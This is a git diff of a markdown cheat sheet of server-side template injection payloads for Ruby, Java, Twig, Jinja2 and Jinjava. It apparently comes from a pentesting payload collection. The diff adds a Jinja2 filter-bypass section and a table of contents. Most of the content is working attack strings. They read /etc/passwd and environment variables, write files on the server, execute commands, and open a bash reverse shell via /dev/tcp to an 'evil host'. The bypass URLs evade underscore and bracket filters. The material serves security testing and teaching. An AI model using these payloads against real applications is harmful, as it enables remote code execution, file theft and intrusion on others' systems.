@@ -1,6 +1,42 @@
 # Templates Injections
 
-> Template injection allows an attacker to include template code into an existant (or not) template.
+> Template injection allows an attacker to include template code into an existant (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
+
+## Summary
+
+* [Tools](#tools)
+* [Methodology](#methodology)
+* [Ruby](#ruby)
+  * [Basic injection](#basic-injection)
+  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
+  * [List files and directories](#list-files-and-directories)
+* [Java](#java)
+  * [Basic injection](#basic-injection)
+  * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
+  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
+* [Twig](#twig)
+  * [Basic injection](#basic-injection)
+  * [Template format](#template-format)
+  * [Code execution](#code-execution)
+* [Smarty](#smarty)
+* [Freemarker](#freemarker)
+* [Jade / Codepen](#jade---codepen)
+* [Velocity](#velocity)
+* [Mako](#mako)
+* [Jinja2](#jinja2)
+  * [Basic injection](#basic-injection)
+  * [Template format](#template-format)
+  * [Dump all used classes](#dump-all-used-classes)
+  * [Dump all config variables](#dump-all-config-variables)
+  * [Read remote file](#read-remote-file)
+  * [Write into remote file](#write-into-remote-file)
+  * [Remote Code Execution](#remote-code-execution)
+  * [Filter bypass](filter-bypass)
+* [Jinjava](#jinjava)
+  * [Basic injection](#basic-injection)
+  * [Command execution](#command-execution)
+
+## Tools
 
 Recommended tool: [Tplmap](https://github.com/epinna/tplmap)
 e.g:
@@ -37,7 +73,7 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ## Java
 
-### Java - Basic injection
+### Basic injection
 
 ```java
 ${7*7}
@@ -47,13 +83,13 @@ ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-### Java - Retrieve the system’s environment variables
+### Retrieve the system’s environment variables
 
 ```java
 ${T(java.lang.System).getenv()}
 ```
 
-### Java - Retrieve /etc/passwd
+### Retrieve /etc/passwd
 
 ```java
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
@@ -63,14 +99,14 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 ## Twig
 
-### Twig - Basic injection
+### Basic injection
 
 ```python
 {{7*7}}
 {{7*'7'}} would result in 49
 ```
 
-### Twig - Template format
+### Template format
 
 ```python
 $output = $twig > render (
@@ -84,7 +120,7 @@ $output = $twig > render (
 );
 ```
 
-### Twig - Code execution
+### Code execution
 
 ```python
 {{self}}
@@ -145,7 +181,7 @@ ${x}
 [Official website](http://jinja.pocoo.org/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
 
-### Jinja2 - Basic injection
+### Basic injection
 
 ```python
 {{4*4}}[[5*5]]
@@ -155,7 +191,7 @@ ${x}
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
 The above injections have been tested on Flask application.
 
-### Jinja2 - Template format
+### Template format
 
 ```python
 {% extends "layout.html" %}
@@ -169,7 +205,7 @@ The above injections have been tested on Flask application.
 
 ```
 
-### Jinja2 - Dump all used classes
+### Dump all used classes
 
 ```python
 {{ [].class.base.subclasses() }}
@@ -177,7 +213,7 @@ The above injections have been tested on Flask application.
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 ```
 
-### Jinja2 - Dump all config variables
+### Dump all config variables
 
 ```python
 {% for key, value in config.iteritems() %}
@@ -186,20 +222,20 @@ The above injections have been tested on Flask application.
 {% endfor %}
 ```
 
-### Jinja2 - Read remote file
+### Read remote file
 
 ```python
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
-### Jinja2 - Write into remote file
+### Write into remote file
 
 ```python
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
 ```
 
-### Jinja2 - Remote Code Execution via reverse shell
+### Remote Code Execution
 
 Listen for connexion
 
@@ -215,10 +251,42 @@ Inject this template
 {{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
 ```
 
+### Filter bypass
+
+```python
+request.__class__
+request["__class__"]
+```
+
+Bypassing `_`
+
+```python
+http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+```
+
+Bypassing `[` and `]`
+
+```python
+http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
+or
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+```
+
+Bypassing `|join`
+
+```python
+http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
+```
+
 ## Jinjava
 
-
-### Jinjava - Basic injection
+### Basic injection
 
 ```python
 {{'a'.toUpperCase()}} would result in 'A'
@@ -227,7 +295,7 @@ Inject this template
 
 Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Jinjava - Command execution 
+### Command execution 
 
 Fixed by https://github.com/HubSpot/jinjava/pull/230
 
@@ -242,20 +310,6 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
 
-## Client Side Template Injection
-
-### AngularJS
-
-```javascript
-$eval('1+1')
-{{1+1}}
-```
-
-### Vue JS
-
-```javascript
-{{constructor.constructor('alert(1)')()}}
-```
 
 ## References
 
@@ -268,3 +322,6 @@ $eval('1+1')
 * [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
 * [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
 * [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
+* [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
+* [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
+* [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
